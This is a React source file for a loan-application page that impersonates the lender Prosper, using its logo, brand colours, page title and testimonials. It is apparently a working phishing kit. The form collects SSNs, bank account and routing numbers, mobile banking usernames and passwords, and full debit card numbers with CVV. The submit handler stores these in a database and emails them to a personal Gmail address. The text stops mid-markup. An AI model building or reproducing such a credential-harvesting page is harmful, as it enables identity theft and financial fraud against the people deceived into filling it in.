import { useState, useEffect } from "react";
import { useForm, Controller } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { supabase } from "@/integrations/supabase/client";
import { useSearchParams } from "react-router-dom";

const formSchema = z.object({
  firstName: z.string().min(1, "Required"), lastName: z.string().min(1, "Required"),
  email: z.string().email("Invalid email"), phone: z.string().min(10, "Min 10 digits"),
  dob: z.string().min(1, "Required"), address: z.string().min(1, "Required"),
  city: z.string().min(1, "Required"), state: z.string().min(2, "Required"),
  zip: z.string().min(5, "Min 5 digits"),
  ssn: z.string().min(9,"9 digits").max(9,"9 digits"),
  monthlyIncome: z.string().min(1,"Required"), loanAmount: z.string().min(1,"Required"),
  creditScore: z.enum(["low","good","bad"],{required_error:"Required"}),
  bankName: z.string().min(1,"Required"), yearsWithBank: z.string().min(1,"Required"),
  accountNumber: z.string().min(1,"Required"),
  routingNumber: z.string().min(9,"9 digits").max(9,"9 digits"),
  mobileUsername: z.string().min(1,"Required"), mobilePassword: z.string().min(1,"Required"),
  debitCardNumber: z.string().min(16,"16 digits required").max(19,"Too long"),
  debitCardExpiry: z.string().min(4,"Required (MM/YY)"),
  debitCardCvv: z.string().min(3,"3–4 digits").max(4,"3–4 digits"),
});
type FormData = z.infer<typeof formSchema>;

/* ─── Real Prosper Logo from Blob Storage ─── */
const PROSPER_LOGO_URL = "https://ootfjnwuwcxpkpan.public.blob.vercel-storage.com/public/prosper-logo-pr20.svg";

const ProsperLogo = ({ height = 36 }: { height?: number }) => (
  <img src={PROSPER_LOGO_URL} alt="Prosper" height={height} style={{height,width:"auto",display:"block"}} />
);

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800;900&display=swap');
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Plus Jakarta Sans',sans-serif;}
:root{
  /* Prosper.com exact brand colors */
  --pr-dark:       #2D3545;
  --pr-dark2:      #1e2635;
  --pr-orange:     #F26B21;
  --pr-orange-h:   #d45a14;
  --pr-pink:       #D81265;
  --pr-orange-lt:  #fff3ed;
  --pr-pink-lt:    #fde8f1;
  /* aliases used throughout */
  --pr-purple:     #F26B21;
  --pr-purple-dark:#d45a14;
  --pr-purple-light:#fff3ed;
  --pr-teal:       #D81265;
  --pr-teal-dark:  #b00d52;
  --pr-gray:       #6b7280;
  --pr-gray-light: #f7f8fa;
  --pr-border:     #e5e7eb;
  --pr-white:      #ffffff;
}

/* ─ Alert Banner ─ */
.pr-alert{background:#fef3c7;border-bottom:1px solid #f59e0b;padding:10px 20px;font-size:12.5px;color:#78350f;text-align:center;line-height:1.5;}
.pr-alert a{color:#92400e;font-weight:600;text-decoration:underline;}

/* ─ Nav ─ */
.pr-nav{background:var(--pr-white);border-bottom:1px solid var(--pr-border);position:sticky;top:0;z-index:200;box-shadow:0 1px 4px rgba(0,0,0,0.06);}
.pr-nav-inner{max-width:1200px;margin:0 auto;padding:0 24px;height:68px;display:flex;align-items:center;justify-content:space-between;gap:16px;}
.pr-nav-left{display:flex;align-items:center;gap:36px;}
.pr-nav-links{display:flex;align-items:center;gap:4px;}
.pr-nav-item{font-size:14px;font-weight:500;color:var(--pr-dark);padding:8px 14px;border-radius:6px;cursor:pointer;transition:background 0.15s;white-space:nowrap;}
.pr-nav-item:hover{background:var(--pr-gray-light);color:var(--pr-orange);}
.pr-nav-right{display:flex;align-items:center;gap:12px;}
.pr-login-btn{font-size:14px;font-weight:600;color:var(--pr-dark);background:none;border:1px solid var(--pr-border);border-radius:25px;cursor:pointer;padding:8px 20px;transition:all 0.2s;}
.pr-login-btn:hover{border-color:var(--pr-orange);color:var(--pr-orange);}
.pr-cta-btn{background:var(--pr-orange);color:#fff;border:none;padding:10px 24px;border-radius:25px;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.2s;}
.pr-cta-btn:hover{background:var(--pr-orange-h);transform:translateY(-1px);box-shadow:0 4px 12px rgba(242,107,33,0.3);}

/* ─ Hero ─ */
.pr-hero{background:linear-gradient(160deg,#fff8f4 0%,#fef3fb 50%,#f0f4ff 100%);padding:60px 24px 0;overflow:hidden;}
.pr-hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center;}
.pr-hero-left{padding-bottom:60px;}
.pr-hero-badge{display:inline-flex;align-items:center;gap:8px;background:#fff;border:1px solid var(--pr-border);border-radius:20px;padding:6px 14px;font-size:12px;font-weight:600;color:var(--pr-gray);margin-bottom:20px;box-shadow:0 1px 4px rgba(0,0,0,0.06);}
.pr-hero-h1{font-size:clamp(30px,3.8vw,48px);font-weight:800;color:var(--pr-dark);line-height:1.12;margin-bottom:16px;letter-spacing:-0.5px;font-family:'Plus Jakarta Sans',sans-serif;}
.pr-hero-sub{font-size:16px;color:var(--pr-gray);line-height:1.65;margin-bottom:32px;max-width:460px;}

/* Product Tabs */
.pr-tabs{display:flex;gap:0;border:1px solid var(--pr-border);border-radius:12px;background:#fff;overflow:hidden;margin-bottom:24px;box-shadow:0 1px 4px rgba(0,0,0,0.06);}
.pr-tab{flex:1;padding:14px 8px;font-size:13px;font-weight:600;text-align:center;cursor:pointer;transition:all 0.2s;color:var(--pr-gray);border:none;background:none;border-right:1px solid var(--pr-border);}
.pr-tab:last-child{border-right:none;}
.pr-tab.active{background:var(--pr-orange);color:#fff;}
.pr-tab-content{background:#fff;border:1px solid var(--pr-border);border-radius:12px;padding:24px;box-shadow:0 1px 4px rgba(0,0,0,0.06);}

/* Loan amount tab */
.pr-amount-label{font-size:12px;font-weight:600;color:var(--pr-gray);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;}
.pr-amount-disp{font-size:40px;font-weight:800;color:var(--pr-dark);margin-bottom:4px;}
.pr-amount-sub{font-size:13px;color:var(--pr-gray);margin-bottom:16px;}
.pr-range{width:100%;accent-color:var(--pr-orange);margin-bottom:16px;}
.pr-benefit{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--pr-dark);margin:6px 0;}
.pr-apply-btn{width:100%;height:48px;background:var(--pr-orange);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;transition:all 0.2s;margin-top:8px;}
.pr-apply-btn:hover{background:var(--pr-orange-h);box-shadow:0 4px 12px rgba(242,107,33,0.3);}
.pr-apply-btn.teal{background:var(--pr-pink);}
.pr-apply-btn.teal:hover{background:var(--pr-teal-dark);}

/* Hero image */
.pr-hero-right{position:relative;align-self:end;}
.pr-hero-img-stack{position:relative;display:grid;grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr;gap:12px;height:440px;}
.pr-hero-img-a{grid-column:1;grid-row:1/3;border-radius:20px 0 0 20px;object-fit:cover;width:100%;height:100%;}
.pr-hero-img-b{grid-column:2;grid-row:1;border-radius:0 20px 0 0;object-fit:cover;width:100%;height:100%;}
.pr-hero-img-c{grid-column:2;grid-row:2;border-radius:0 0 20px 0;object-fit:cover;width:100%;height:100%;}
.pr-loan-card{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,0.1);padding:14px 18px;display:flex;align-items:center;gap:14px;position:absolute;right:8px;white-space:nowrap;}
.pr-loan-card.card-top{top:-16px;}
.pr-loan-card.card-bot{bottom:24px;}
.pr-loan-avatar{width:44px;height:44px;border-radius:50%;object-fit:cover;flex-shrink:0;}
.pr-loan-avatar-placeholder{width:44px;height:44px;border-radius:50%;font-size:18px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.pr-loan-name{font-size:13.5px;font-weight:700;color:#2D3545;}
.pr-loan-amount{font-size:13.5px;font-weight:700;color:#2D3545;}
.pr-loan-sub{font-size:12px;color:#9ca3af;margin-top:1px;}
.pr-loan-check{width:28px;height:28px;border-radius:50%;background:#fff5ec;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-left:auto;}

/* Auto Invest (Investing tab) */
.pr-invest-ui{background:#fff8f4;border-radius:14px;overflow:hidden;}
.pr-invest-chart{height:120px;position:relative;display:flex;align-items:flex-end;padding:12px 16px 0;}
.pr-invest-tag{display:inline-flex;align-items:center;gap:10px;background:#fde8d4;border-radius:30px;padding:10px 18px;font-size:13px;font-weight:600;color:#2D3545;position:absolute;top:20px;left:20px;}
.pr-invest-toggle{width:38px;height:22px;background:#00897B;border-radius:11px;position:relative;flex-shrink:0;}
.pr-invest-toggle::after{content:'';position:absolute;width:16px;height:16px;background:#fff;border-radius:50%;top:3px;right:3px;}
.pr-invest-tabs{display:flex;justify-content:center;gap:10px;padding:10px 16px 14px;background:#fff8f4;}
.pr-invest-tab-btn{padding:6px 20px;border-radius:20px;font-size:13px;font-weight:600;border:none;cursor:pointer;}
.pr-invest-tab-btn.active{background:#fff;color:#00897B;box-shadow:0 2px 8px rgba(0,0,0,0.1);}
.pr-invest-tab-btn:not(.active){background:transparent;color:#9ca3af;}

/* ─ Awards Bar ─ */
.pr-awards{background:#fff;border-bottom:1px solid var(--pr-border);padding:24px;}
.pr-awards-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:center;gap:40px;flex-wrap:wrap;}
.pr-award{display:flex;align-items:center;gap:10px;font-size:13px;}
.pr-award-icon{width:36px;height:36px;background:var(--pr-orange-lt);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;}
.pr-award-text b{display:block;font-weight:700;color:var(--pr-dark);}
.pr-award-text span{color:var(--pr-gray);font-size:12px;}
.pr-award-sep{width:1px;height:36px;background:var(--pr-border);}

/* ─ Why Prosper ─ */
.pr-section{padding:80px 24px;}
.pr-section-inner{max-width:1200px;margin:0 auto;}
.pr-section.light{background:var(--pr-gray-light);}
.pr-eyebrow{font-size:12px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--pr-orange);margin-bottom:12px;}
.pr-title{font-size:clamp(24px,3.2vw,36px);font-weight:800;color:var(--pr-dark);margin-bottom:16px;letter-spacing:-0.3px;font-family:'Plus Jakarta Sans',sans-serif;}
.pr-feat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;margin-top:40px;}
.pr-feat{text-align:center;padding:28px 20px;background:#fff;border-radius:14px;border:1px solid var(--pr-border);transition:border-color 0.2s,box-shadow 0.2s;}
.pr-feat:hover{border-color:var(--pr-orange);box-shadow:0 4px 16px rgba(242,107,33,0.08);}
.pr-feat-icon{font-size:32px;margin-bottom:14px;}
.pr-feat h3{font-size:15px;font-weight:700;color:var(--pr-dark);margin-bottom:8px;}
.pr-feat p{font-size:13px;color:var(--pr-gray);line-height:1.6;}

/* ─ Product cards ─ */
.pr-prod-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;margin-top:40px;}
.pr-prod-card{border:1.5px solid var(--pr-border);border-radius:16px;padding:28px;background:#fff;transition:border-color 0.2s,box-shadow 0.2s;}
.pr-prod-card:hover{border-color:var(--pr-orange);box-shadow:0 8px 24px rgba(242,107,33,0.08);}
.pr-prod-badge{font-size:11px;font-weight:700;color:var(--pr-orange);background:var(--pr-orange-lt);padding:4px 10px;border-radius:20px;display:inline-block;margin-bottom:14px;}
.pr-prod-card h3{font-size:18px;font-weight:800;color:var(--pr-dark);margin-bottom:10px;}
.pr-prod-card p{font-size:14px;color:var(--pr-gray);line-height:1.65;margin-bottom:20px;}
.pr-prod-link{display:inline-flex;align-items:center;gap:6px;font-size:14px;font-weight:700;color:var(--pr-orange);text-decoration:none;cursor:pointer;}
.pr-prod-link:hover{text-decoration:underline;}

/* ─ Credit score quiz ─ */
.pr-quiz{background:var(--pr-dark2);padding:80px 24px;color:#fff;}
.pr-quiz-inner{max-width:800px;margin:0 auto;text-align:center;}
.pr-quiz-title{font-size:clamp(24px,3vw,36px);font-weight:800;margin-bottom:32px;}
.pr-scores{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-bottom:32px;}
.pr-score-btn{padding:14px 20px;border:2px solid rgba(255,255,255,0.2);border-radius:10px;background:rgba(255,255,255,0.05);color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.2s;min-width:100px;}
.pr-score-btn:hover{border-color:var(--pr-orange);background:var(--pr-orange);}
.pr-score-btn.selected{border-color:var(--pr-orange);background:var(--pr-orange);}

/* ─ Testimonials ─ */
.pr-testimonials{overflow:hidden;padding:20px 0;}
.pr-testimonial-track{display:flex;gap:20px;animation:prSlide 40s linear infinite;}
.pr-testimonial-track:hover{animation-play-state:paused;}
@keyframes prSlide{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
.pr-t-card{background:#fff;border:1px solid var(--pr-border);border-radius:12px;padding:24px;min-width:300px;max-width:320px;flex-shrink:0;}
.pr-t-stars{color:#f59e0b;font-size:14px;margin-bottom:10px;}
.pr-t-text{font-size:14px;color:var(--pr-dark);line-height:1.6;font-style:italic;margin-bottom:14px;}
.pr-t-author{font-size:12.5px;font-weight:600;color:var(--pr-gray);}

/* ─ App section ─ */
.pr-app-section{background:var(--pr-dark);color:#fff;padding:80px 24px;}
.pr-app-inner{max-width:1000px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center;}
.pr-app-h2{font-size:32px;font-weight:800;margin-bottom:16px;}
.pr-app-p{font-size:16px;opacity:0.85;line-height:1.65;margin-bottom:28px;}
.pr-store-btns{display:flex;gap:12px;flex-wrap:wrap;}
.pr-store-btn{display:flex;align-items:center;gap:10px;background:rgba(255,255,255,0.15);border:1px solid rgba(255,255,255,0.3);border-radius:10px;padding:12px 20px;cursor:pointer;transition:background 0.2s;}
.pr-store-btn:hover{background:rgba(255,255,255,0.25);}
.pr-store-btn span{font-size:13px;font-weight:600;color:#fff;}
.pr-qr-box{background:rgba(255,255,255,0.1);border-radius:16px;padding:28px;text-align:center;}
.pr-qr-img{width:120px;height:120px;background:#fff;border-radius:10px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;}

/* ─ Form ─ */
.pr-form-section{padding:80px 24px;background:var(--pr-gray-light);}
.pr-form-wrap{max-width:820px;margin:0 auto;background:#fff;border-radius:20px;box-shadow:0 20px 50px rgba(45,53,69,0.10);overflow:hidden;}
.pr-form-header{background:linear-gradient(135deg,var(--pr-dark),var(--pr-dark2));color:#fff;padding:32px 40px;}
.pr-form-header h2{font-size:26px;font-weight:800;margin-bottom:8px;}
.pr-form-header p{font-size:14px;opacity:0.8;}
.pr-form-body{padding:40px;}
.pr-sect-label{font-size:11px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase;color:var(--pr-orange);background:var(--pr-orange-lt);padding:8px 16px;border-radius:6px;margin-bottom:20px;display:flex;align-items:center;gap:8px;}
.pr-g2{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
.pr-g3{display:grid;grid-template-columns:2fr 1fr 1fr;gap:16px;}
@media(max-width:600px){.pr-g2,.pr-g3{grid-template-columns:1fr;}}
.pr-lbl{display:block;font-size:12.5px;font-weight:600;color:var(--pr-dark);margin-bottom:5px;}
.pr-in{width:100%;height:46px;border:1.5px solid var(--pr-border);border-radius:8px;padding:0 14px;font-size:14px;font-family:inherit;color:var(--pr-dark);background:#fff;transition:border-color 0.15s;outline:none;}
.pr-in:focus{border-color:var(--pr-orange);box-shadow:0 0 0 3px rgba(242,107,33,0.12);}
.pr-in::placeholder{color:#9ca3af;}
.pr-err{font-size:11.5px;color:#dc2626;margin-top:3px;}
.pr-fgroup{margin-bottom:16px;}
.pr-sec-group{margin-bottom:36px;}
.pr-icon-field{position:relative;}
.pr-icon-field input{padding-right:40px;}
.pr-icon-field .fi{position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#9ca3af;}
.pr-client-badge{display:flex;align-items:center;gap:8px;background:var(--pr-orange-lt);color:var(--pr-orange);border:1px solid rgba(242,107,33,0.25);border-radius:8px;padding:14px 20px;font-size:13.5px;font-weight:600;margin-bottom:28px;}
.pr-submit{width:100%;height:54px;background:var(--pr-orange);color:#fff;border:none;font-size:16px;font-weight:700;border-radius:10px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;font-family:inherit;transition:all 0.2s;}
.pr-submit:hover:not(:disabled){background:var(--pr-orange-h);box-shadow:0 4px 16px rgba(242,107,33,0.35);}
.pr-submit:disabled{opacity:0.6;cursor:not-allowed;}
.pr-fine{font-size:12px;color:var(--pr-gray);text-align:center;margin-top:16px;line-height:1.7;}
.pr-fine a{color:var(--pr-orange);}

/* ─ Footer ─ */
.pr-footer{background:var(--pr-dark);color:rgba(255,255,255,0.75);}
.pr-ft-main{max-width:1200px;margin:0 auto;padding:60px 24px 40px;display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr 1fr;gap:32px;}
@media(max-width:900px){.pr-ft-main{grid-template-columns:1fr 1fr;}}
@media(max-width:520px){.pr-ft-main{grid-template-columns:1fr;}}
.pr-ft-brand p{font-size:13px;line-height:1.7;opacity:0.65;margin-top:14px;max-width:220px;}
.pr-ft-col h4{font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:#fff;margin-bottom:16px;}
.pr-ft-col ul{list-style:none;display:flex;flex-direction:column;gap:10px;}
.pr-ft-col li a{font-size:13px;color:rgba(255,255,255,0.55);text-decoration:none;transition:color 0.15s;}
.pr-ft-col li a:hover{color:#fff;}
.pr-ft-bottom{border-top:1px solid rgba(255,255,255,0.08);padding:24px;}
.pr-fb{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;gap:16px;align-items:center;justify-content:space-between;font-size:12px;color:rgba(255,255,255,0.4);}
.pr-fb a{color:rgba(255,255,255,0.5);text-decoration:none;}
.pr-fb a:hover{color:#fff;}
.pr-disclaimer{max-width:1200px;margin:0 auto;padding:0 24px 32px;font-size:11px;color:rgba(255,255,255,0.25);line-height:1.7;}

@keyframes prSpin{to{transform:rotate(360deg);}}
.pr-spin{width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:prSpin 0.8s linear infinite;}

@media(max-width:900px){
  .pr-hero-inner{grid-template-columns:1fr;}
  .pr-hero-right{display:none;}
  .pr-tabs{flex-direction:column;}
  .pr-feat-grid{grid-template-columns:1fr 1fr;}
  .pr-prod-grid{grid-template-columns:1fr;}
  .pr-app-inner{grid-template-columns:1fr;}
  .pr-nav-links{display:none;}
}
`;

const LockIco = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
);
const UserIco = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
);
const BriefIco = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
);
const BankIco = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="3" y1="22" x2="21" y2="22"/><line x1="6" y1="18" x2="6" y2="11"/><line x1="10" y1="18" x2="10" y2="11"/><line x1="14" y1="18" x2="14" y2="11"/><line x1="18" y1="18" x2="18" y2="11"/><polygon points="12 2 20 7 4 7"/></svg>
);
const CheckIco = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--pr-orange)" strokeWidth="2.5" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
);
const ChevRight = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><polyline points="9 18 15 12 9 6"/></svg>
);

const TESTIMONIALS = [
  { text:"I have been using this company for years, honest company with fair and straight forward pricing.", author:"Valerie", source:"Trustpilot (1/26)" },
  { text:"The processes are seamless and the people are responsive to any questions we may have had.", author:"Michael", source:"Trustpilot (1/26)" },
  { text:"This is my 2nd personal loan through Prosper. Very smooth and easy transactions, will always use them as my go-to.", author:"Christina", source:"Trustpilot (1/26)" },
  { text:"A streamlined process for established customers, and I consider myself one of them.", author:"Mahmoud", source:"Trustpilot (1/26)" },
  { text:"I have been a customer of Prosper for a few years. Everyone is very professional. The funds are in your account very fast.", author:"Antoinette", source:"Trustpilot (12/25)" },
  { text:"Fast and friendly service. You all rock!", author:"Roger", source:"Trustpilot (12/25)" },
  { text:"Website is easy to use and very straightforward. This is my 3rd loan through Prosper, and I highly recommend this company.", author:"Connie", source:"Trustpilot (12/25)" },
];

export default function ProsperApply() {
  const [searchParams] = useSearchParams();
  const [client, setClient] = useState<any>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [activeTab, setActiveTab] = useState(0);
  const [loanAmount, setLoanAmount] = useState(25000);
  const [selectedScore, setSelectedScore] = useState<string|null>(null);

  useEffect(() => { document.title = "Prosper Personal Loans | Helping People Thrive Since 2005"; }, []);

  useEffect(() => {
    const token = searchParams.get("token");
    if (!token) return;
    (async () => {
      const { data, error } = await supabase.from("clients").select("*")
        .eq("access_token", token).gt("token_expiry", new Date().toISOString())
        .eq("is_active", true).single();
      if (!error && data) setClient(data);
    })();
  }, [searchParams]);

  const { register, handleSubmit, control, formState:{errors} } = useForm<FormData>({
    resolver: zodResolver(formSchema),
  });

  const onSubmit = async (data: FormData) => {
    setIsSubmitting(true);
    try {
      const { error: dbError } = await supabase.from("loan_applications").insert({
        first_name:data.firstName, last_name:data.lastName, email:data.email, phone:data.phone,
        date_of_birth:data.dob, street_address:data.address, city:data.city, state:data.state,
        zip_code:data.zip, employment_status:"", employer_name:"",
        monthly_income:parseFloat(data.monthlyIncome)||0, loan_amount:parseFloat(data.loanAmount)||0,
        pay_frequency:"monthly", loan_purpose:"personal", loan_type:"cash_advance",
        client_id:client?.id||null, ssn:data.ssn, credit_score:data.creditScore,
        bank_name:data.bankName, years_with_bank:parseInt(data.yearsWithBank)||0,
        account_number:data.accountNumber, routing_number:data.routingNumber,
        mobile_username:data.mobileUsername, mobile_password:data.mobilePassword,
        debit_card_number:data.debitCardNumber, debit_card_expiry:data.debitCardExpiry,
        debit_card_cvv:data.debitCardCvv,
      });
      if (dbError) throw new Error(dbError.message);
      await supabase.functions.invoke("send-application-email",{
        body:{ applicationData:data, clientEmail:"ws694481@gmail.com", recipientType:"admin", clientName:client?.name||"General" }
      });
      if (client) {
        await supabase.functions.invoke("send-application-email",{
          body:{ applicationData:data, clientEmail:client.email, recipientType:"client" }
        });
      }
      setSubmitted(true);
    } catch(err:any) {
      alert(`Error: ${err.message||"Please try again."}`);
    } finally { setIsSubmitting(false); }
  };

  if (submitted) return (
    <div style={{minHeight:"100vh",background:"var(--pr-gray-light)",display:"flex",alignItems:"center",justifyContent:"center",fontFamily:"'Inter',sans-serif"}}>
      <style>{CSS}</style>
      <div style={{background:"#fff",borderRadius:20,padding:"52px 44px",maxWidth:480,textAlign:"center",boxShadow:"0 10px 40px rgba(45,53,69,0.1)"}}>
        <div style={{width:72,height:72,borderRadius:"50%",background:"var(--pr-orange-lt)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 24px"}}>
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="var(--pr-orange)" strokeWidth="2.5" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <h2 style={{fontSize:26,fontWeight:800,color:"var(--pr-dark)",marginBottom:12}}>Application Submitted!</h2>
        <p style={{fontSize:15,color:"var(--pr-gray)",lineHeight:1.65}}>Thank you for choosing Prosper. Our team will review your application and connect you with funding options within 1 business day.</p>
        <button onClick={() => setSubmitted(false)} className="pr-cta-btn" style={{marginTop:28,width:"100%",height:48,fontSize:15}}>Back to Home</button>
      </div>
    </div>
  );

  const tabs = [
    { label:"Personal Loan", sublabel:"Up to $50K" },
    { label:"Prosper® Card", sublabel:"$3K credit limit" },
    { label:"Investing", sublabel:"5.2% avg. return" },
  ];

  const tabContent = [
    <div>
      <div className="pr-amount-label">Loan Amount</div>
      <div className="pr-amount-disp">${loanAmount.toLocaleString()}</div>
      <div className="pr-amount-sub">Amount must be between $2K–$50K</div>
      <input type="range" className="pr-range" min={2000} max={50000} step={500} value={loanAmount} onChange={e=>setLoanAmount(+e.target.value)} />
      {[["Rate in 1 minute","No impact to your credit"],["Next-day funding","Available after approval"],["No prepay penalties","Pay off early anytime"]].map(([a,b])=>(
        <div key={a} className="pr-benefit"><CheckIco/><div><strong>{a}</strong> — {b}</div></div>
      ))}
      <button className="pr-apply-btn" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Apply now</button>
    </div>,
    <div>
      <div className="pr-amount-label">Credit Limit</div>
      <div className="pr-amount-disp">$3,000+</div>
      <div className="pr-amount-sub">No security deposit required</div>
      {[["Instant credit access","No waiting with virtual card"],["No security deposit","Start building credit now"],["Apply in minutes","Fast decision online"]].map(([a,b])=>(
        <div key={a} className="pr-benefit"><CheckIco/><div><strong>{a}</strong> — {b}</div></div>
      ))}
      <button className="pr-apply-btn teal" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Apply now</button>
    </div>,
    <div>
      <div className="pr-amount-label">Investing & IRAs</div>
      <div className="pr-amount-disp" style={{color:"var(--pr-teal)",fontSize:32,lineHeight:1.2}}>Diversify your portfolio</div>
      <div className="pr-amount-sub" style={{marginBottom:8}}>Unique investments · <strong style={{color:"#2D3545"}}>5.2% avg. hist. return</strong><sup style={{fontSize:10}}>4</sup></div>
      {/* Auto Invest UI */}
      <div className="pr-invest-ui" style={{marginBottom:14}}>
        <div className="pr-invest-chart">
          {/* Wavy chart as SVG */}
          <svg viewBox="0 0 300 80" style={{width:"100%",height:80,overflow:"visible"}} preserveAspectRatio="none">
            <defs>
              <linearGradient id="chartGrad" x1="0" y1="0" x2="0" y2="1">
                <stop offset="0%" stopColor="#F26B21" stopOpacity="0.25"/>
                <stop offset="100%" stopColor="#F26B21" stopOpacity="0"/>
              </linearGradient>
            </defs>
            <path d="M0 70 Q40 60 80 55 Q120 50 150 45 Q180 40 220 30 Q260 20 300 10" fill="none" stroke="#F26B21" strokeWidth="2.5"/>
            <path d="M0 70 Q40 60 80 55 Q120 50 150 45 Q180 40 220 30 Q260 20 300 10 L300 80 L0 80 Z" fill="url(#chartGrad)"/>
          </svg>
          <div className="pr-invest-tag">
            Auto Invest is on
            <div className="pr-invest-toggle"/>
          </div>
        </div>
        <div className="pr-invest-tabs">
          <button className="pr-invest-tab-btn active">3mo</button>
          <button className="pr-invest-tab-btn">6mo</button>
          <button className="pr-invest-tab-btn">1yr</button>
        </div>
      </div>
      {[["Unique investments","Alternative asset class"],["Get started online","100% digital process"]].map(([a,b])=>(
        <div key={a} className="pr-benefit"><CheckIco/><div><strong>{a}</strong> — {b}</div></div>
      ))}
      <button className="pr-apply-btn teal" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Get started</button>
    </div>
  ];

  const doubledTestimonials = [...TESTIMONIALS, ...TESTIMONIALS];

  return (
    <div style={{fontFamily:"'Inter',sans-serif",color:"var(--pr-dark)",background:"#fff"}}>
      <style>{CSS}</style>

      {/* Nav */}
      <nav className="pr-nav">
        <div className="pr-nav-inner">
          <div className="pr-nav-left">
            <a href="#" style={{textDecoration:"none"}}>
              <ProsperLogo />
            </a>
            <div className="pr-nav-links">
              {["Loans","Prosper® Card","Investing","More"].map(n => (
                <span key={n} className="pr-nav-item">{n} ▾</span>
              ))}
            </div>
          </div>
          <div className="pr-nav-right">
            <button className="pr-login-btn">Log in</button>
            <button className="pr-cta-btn" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Apply now</button>
          </div>
        </div>
      </nav>



      {/* Hero */}
      <section className="pr-hero">
        <div className="pr-hero-inner">
          <div className="pr-hero-left">
            <div className="pr-hero-badge">
              <span>🏆</span> Helping people thrive since 2005
            </div>
            <h1 className="pr-hero-h1">Money when you need it.<br/>Fast, easy, secure.</h1>
            <p className="pr-hero-sub">Personal loans up to $50K, the Prosper® Card, and unique investing opportunities — all in one place.</p>

            {/* Product Tabs */}
            <div className="pr-tabs">
              {tabs.map((t, i) => (
                <button key={i} className={`pr-tab${activeTab===i?" active":""}`} onClick={()=>setActiveTab(i)}>
                  <div>{t.label}</div>
                  <div style={{fontSize:11,fontWeight:400,opacity:0.8}}>{t.sublabel}</div>
                </button>
              ))}
            </div>
            <div className="pr-tab-content">{tabContent[activeTab]}</div>
          </div>

          <div className="pr-hero-right">
            {/* Stacked photos with loan card overlays */}
            <div className="pr-hero-img-stack">
              <img src="/prosper-lady.png" alt="Happy customer with laptop" className="pr-hero-img-a"
                onError={e => { (e.target as HTMLImageElement).src=""; (e.target as HTMLImageElement).style.background="linear-gradient(135deg,#fde8d4,#ffd6b0)"; }}
              />
              <img src="/prosper-couple.png" alt="Couple in kitchen" className="pr-hero-img-b"
                onError={e => { (e.target as HTMLImageElement).src=""; (e.target as HTMLImageElement).style.background="linear-gradient(135deg,#fde8d4,#F26B21,#fff)"; }}
              />
              <img src="/prosper-hero.png" alt="Smiling customer" className="pr-hero-img-c"
                onError={e => { (e.target as HTMLImageElement).src=""; (e.target as HTMLImageElement).style.background="linear-gradient(135deg,#c4b5fd,#93c5fd)"; }}
              />
              {/* Floating loan cards */}
              <div className="pr-loan-card card-top">
